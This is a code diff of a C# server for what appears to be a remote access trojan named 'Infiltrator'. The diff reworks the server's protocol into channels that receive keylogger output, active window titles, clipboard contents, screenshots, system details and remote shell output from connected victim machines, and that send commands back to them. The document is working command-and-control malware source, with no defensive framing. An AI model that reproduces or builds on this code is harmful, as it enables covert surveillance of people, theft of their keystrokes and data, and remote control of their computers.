@@ -1,10 +1,11 @@
 ﻿using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Text;
-using Server.Cliente;
 using Server.Log;
-using static System.Windows.Forms.VisualStyles.VisualStyleElement;
+using static System.Net.Mime.MediaTypeNames;
+
 
 
 namespace Server.Conexion
@@ -20,16 +21,12 @@ namespace Server.Conexion
         private static Logger _logger = Logger.getInstance();
         public static BindingList<Cliente.Cliente> clientesConectados = new BindingList<Cliente.Cliente>();
 
+        public static bool serverStatus() => _isRunning;
+        public static bool isWaiting() => _waitingForResponse;
 
-        public static bool serverStatus()
-        {
-            return _isRunning;
-        }
+   
+  
 
-        public static bool isWaiting()
-        {
-            return _waitingForResponse;
-        }
 
         public static void stopServer()
         {
@@ -55,18 +52,13 @@ namespace Server.Conexion
         {
             try
             {
-                if (client != null && client.Client != null && client.Client.Connected)
+                if (client?.Client != null && client.Client.Connected)
                 {
-                    // Make a non-blocking call to see if the client is still connected
                     bool part1 = client.Client.Poll(1000, SelectMode.SelectRead);
                     bool part2 = (client.Client.Available == 0);
-                    if (part1 && part2)
-                        return false;
-                    else
-                        return true;
+                    return !(part1 && part2);
                 }
-                else
-                    return false;
+                return false;
             }
             catch
             {
@@ -74,17 +66,16 @@ namespace Server.Conexion
             }
         }
 
-
-
-        public static void SendCommand(int clientId, string command)
+        public static void SendCommand(int clientId, string command, Channel ch)
         {
             lock (_clients)
             {
                 if (_clients.TryGetValue(clientId, out TcpClient client))
                 {
                     NetworkStream stream = client.GetStream();
+                    
                     byte[] commandBytes = Encoding.UTF8.GetBytes(command);
-                    stream.Write(commandBytes, 0, commandBytes.Length);
+                    Protocol.Send(stream, ch, commandBytes);
                 }
                 else
                 {
@@ -120,16 +111,19 @@ namespace Server.Conexion
             }
         }
 
-        public static void setWaiting(bool status)
-        {
-            _waitingForResponse = status;
-        }
+
+        public static void setWaiting(bool status) => _waitingForResponse = status;
+
 
         public static void startServer()
         {
+            
+
             _listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
             _listener.Start();
             _logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}", LogLevel.INFO);
+                
+
             Thread acceptClientsThread = new Thread(AcceptClients);
             acceptClientsThread.Start();
             _isRunning = true;
@@ -137,7 +131,7 @@ namespace Server.Conexion
 
         public static void disconnectClient(int clientId) 
         {
-            ServerSocket.SendCommand(clientId,"disconnect");        
+            ServerSocket.SendCommand(clientId,"disconnect",Channel.Main);        
         }
 
         public static TcpClient getClientById(int clientId)
@@ -156,149 +150,177 @@ namespace Server.Conexion
             }
         }
 
+
+
         public static void HandleClient(TcpClient client, int clientId)
         {
-            NetworkStream stream = client.GetStream();
-            byte[] buffer = new byte[Config.BufferLength];
-            int bytesRead;
+            var stream = client.GetStream();
+            var buffer = new byte[Config.BufferLength];
 
             try
             {
-                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
+                while (true)
                 {
-                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                    // Verificar si se recibió un archivo
-                    if (data.StartsWith("FILE:"))
-                    {
-                        string fileName = data.Substring(5).Trim();
-                        _logger.Log($"Recibiendo archivo {fileName}", LogLevel.INFO);
-                        // Recibir datos del archivo
-                        using (MemoryStream ms = new MemoryStream())
-                        {
-                            bool fileEndReceived = false;
-                            long totalBytesReceived = 0;
-                            int totalBytesToReceive = 0;
+                    // 1) leer el primer byte para ver si es un canal multiplexado
+                    int b = stream.ReadByte();
+                    if (b < 0) break;
+                    var ch = (Channel)b;
 
-                            while (!fileEndReceived)
-                            {
-                                bytesRead = stream.Read(buffer, 0, buffer.Length);
-                                if (bytesRead == 0)
+                    if (Enum.IsDefined(typeof(Channel), ch))
+                    {
+                        // 2) multiplexado: 4 bytes de longitud + payload
+                        ReadExact(stream, buffer, 0, 4);
+                        int len = BitConverter.ToInt32(buffer, 0);
+                        if (len < 0 || len > Config.BufferLength)
+                            throw new Exception($"Longitud inválida: {len}");
+
+                        ReadExact(stream, buffer, 0, len);
+                        byte[] payload = new byte[len];
+                        Array.Copy(buffer, 0, payload, 0, len);
+
+                        // 3) despachar por canal
+                        switch (ch)
+                        {
+                            case Channel.Keylogger:
                                 {
-                                    // Conexión cerrada
+                                    var form = Keylogger.Instance;
+                                    if (form.InvokeRequired)
+                                        form.Invoke(new Action(() => form.AppendLog(Encoding.UTF8.GetString(payload))));
+                                    else
+                                        form.AppendLog(Encoding.UTF8.GetString(payload));
                                     break;
                                 }
 
-                                // Verificar si se recibió el mensaje de fin de archivo
-                                string chunkAsString = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                                if (chunkAsString.Contains("FILE_END"))
+                            case Channel.ActiveWindow:
                                 {
-                                    fileEndReceived = true;
-                                    int endIndex = chunkAsString.IndexOf("FILE_END");
-                                    ms.Write(buffer, 0, endIndex);
-                                    totalBytesReceived += endIndex;
+                                    var form = Keylogger.Instance;
+                                    if (form.InvokeRequired)
+                                        form.Invoke(new Action(() => form.AppendActiveWindow(Encoding.UTF8.GetString(payload))));
+                                    else
+                                        form.AppendActiveWindow(Encoding.UTF8.GetString(payload));
+                                    break;
                                 }
-                                else
+                            case Channel.Clipboard:
                                 {
-                                    ms.Write(buffer, 0, bytesRead);
-                                    totalBytesReceived += bytesRead;
+                                    var form = Keylogger.Instance;
+                                    if (form.InvokeRequired)
+                                        form.Invoke(new Action(() => form.AppendClipboard(Encoding.UTF8.GetString(payload))));
+                                    else
+                                        form.AppendClipboard(Encoding.UTF8.GetString(payload));
+                                    break;
                                 }
 
-                                // Actualizar la barra de progreso
-                                totalBytesToReceive += bytesRead;
-                            }
-                            SaveFile(fileName, ms.ToArray());
+                            case Channel.Screenshot:
+                                SaveScreenshot(payload);
+                                
+                                break;
+
+                            case Channel.Streaming:
+                                
+                                break;
+
+                            case Channel.File:
+                                // Aquí se maneja el canal de archivos
+                                break;
+                            case Channel.SystemInfo:
+                                // Aquí se maneja el canal de archivos
+                                Cliente.Cliente cliente = new Cliente.Cliente();
+
+                                string sysInfo = Encoding.UTF8.GetString(payload);
+                                string[] lineas = sysInfo.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
+
+                                foreach (string linea in lineas)
+                                {
+                                    if (linea.Contains("Nombre del equipo:"))
+                                        cliente.Equipo = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Usuario:"))
+                                        cliente.Usuario = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("IP:"))
+                                        cliente.IP = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Sistema operativo:"))
+                                        cliente.Sistema = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Versión de .NET:"))
+                                        cliente.DotNet = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Número de procesadores:"))
+                                        cliente.Procesadores = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Memoria RAM:"))
+                                        cliente.RAM = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Procesador:"))
+                                        cliente.CPU = linea.Split(':')[1].Trim();
+                                    else if (linea.Contains("Tarjeta Gráfica:"))
+                                        cliente.GPU = linea.Split(':')[1].Trim();
+                                }
+                                cliente.ID = _clientIdCounter;
+                                cliente.Port = ((IPEndPoint)client.Client.RemoteEndPoint).Port.ToString();
+
+                                MainForm.Instance.AgregarOActualizarCliente(cliente);
+                                break;
+                            case Channel.CommandOutput:
+                                string output = Encoding.UTF8.GetString(payload);
+                                Shell.Instance.AppendCommandOutput(output);
+                                ServerSocket.setWaiting(false);
+                                break;
+                        
+                            case Channel.Main:
+                                
+                                string command = Encoding.UTF8.GetString(payload);
+                                if (command.StartsWith("disconnect"))
+                                {
+                                    _logger.Log($"Cliente {clientId} desconectado por comando.", LogLevel.INFO);
+                                    disconnectClient(clientId);
+                                    return;
+                                }
+
+                                break;
+
                         }
                     }
-                    else if (data.StartsWith("SYSINFO:")) {
-
-                        Server.Cliente.Cliente cliente = new Server.Cliente.Cliente(); 
-
-                        string sysInfo = data.Substring("SYSINFO:".Length).Trim();
-
-                        string nombreEquipo = "", usuario = "", sistema = "", netVersion = "";
-                        string procesadores = "", ram = "", cpu = "", gpu = "";
-
-                        string[] lineas = sysInfo.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
-
-                        foreach (string linea in lineas)
-                        {
-                            if (linea.Contains("Nombre del equipo:"))
-                               cliente.Equipo = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Usuario:"))
-                               cliente.Usuario = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("IP:"))
-                                cliente.IP = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Sistema operativo:"))
-                                cliente.Sistema = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Versión de .NET:"))
-                                cliente.DotNet = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Número de procesadores:"))
-                                cliente.Procesadores = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Memoria RAM:"))
-                                cliente.RAM = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Procesador:"))
-                                cliente.CPU = linea.Split(':')[1].Trim();
-                            else if (linea.Contains("Tarjeta Gráfica:"))
-                                cliente.GPU = linea.Split(':')[1].Trim();
-
-
-                        }
-                        cliente.ID = _clientIdCounter;
-                        cliente.Port = ((IPEndPoint)client.Client.RemoteEndPoint).Port.ToString();
-
-                        MainForm.Instance.AgregarOActualizarCliente(cliente);
-
-
-                    }else if (data.StartsWith("CMDOUT:"))
-                    {
-                        string output = data.Substring("CMDOUT:".Length).Trim();
-                        Shell.Instance.AppendCommandOutput(output);
-                        ServerSocket.setWaiting(false);
-
-                    }else if (data.StartsWith("KEYLOG:"))
-                    {
-                        string output = data.Substring("KEYLOG:".Length).Trim();
-                        Keylogger.Instance.AppendLog(output);
-                    }
-                    else if (data.StartsWith("ACTWNDW:"))
-                    {
-                        string output = data.Substring("ACTWNDW:".Length).Trim();
-                        Keylogger.Instance.AppendActiveWindow(output);
-                    }
-                    else if (data.StartsWith("CLPBRD:"))
-                    {
-                        string output = data.Substring("CLPBRD:".Length).Trim();
-                        Keylogger.Instance.AppendClipboard(output);
-                    }
-
                 }
             }
             catch (Exception ex)
             {
-                
-                _logger.Log($"Error al manejar al cliente {clientId}: {ex.Message}", LogLevel.ERROR);
+                _logger.Log($"Error cliente {clientId}: {ex.Message}", LogLevel.ERROR);
             }
-
-            lock (_clients)
+            finally
             {
-                // Buscar el cliente por su ID en la lista de clientes conectados
-                var cliente = clientesConectados.FirstOrDefault(c => c.ID == clientId);
-
-                if (cliente != null)
-                {
-                    // Cambiar el estado del cliente a "Desconectado"
-                    cliente.Estado = "Desconectado";
-
-                    // Actualizar la lista (esto debería reflejarse en la UI debido a BindingList)
-                    MainForm.Instance.ActualizarCliente(cliente);  // Suponiendo que tienes un método en Form1 para actualizar el cliente
-                }
-
-                // Eliminar el cliente de la lista de _clients
+                client.Close();
                 _clients.Remove(clientId);
+                _logger.Log($"Cliente {clientId} desconectado", LogLevel.INFO);
+            }
+        }
+
+
+        private static void ReadExact(NetworkStream stream, byte[] buffer, int offset, int count)
+        {
+            int read, total = 0;
+            while (total < count)
+            {
+                read = stream.Read(buffer, offset + total, count - total);
+                if (read == 0) throw new IOException("Conexión cerrada");
+                total += read;
+            }
+        }
+
+        public static void SaveScreenshot(byte[] imageData)
+        {
+            string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "screenshots");
+            Directory.CreateDirectory(screenshotPath);
+
+            string fileName = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
+            string fullPath = Path.Combine(screenshotPath, fileName);
+
+            try
+            {
+                File.WriteAllBytes(fullPath, imageData);
+                _logger.Log($"Captura de pantalla guardada en: {fullPath}", LogLevel.INFO);
+                Screenshot.Instance.DisplayScreenshot(fullPath);
+            }
+            catch (Exception ex)
+            {
+                _logger.Log($"Error al guardar captura: {ex.Message}", LogLevel.ERROR);
             }
 
-            client.Close();
-            _logger.Log($"Cliente {clientId} desconectado.", LogLevel.INFO);
+
         }
 
     }
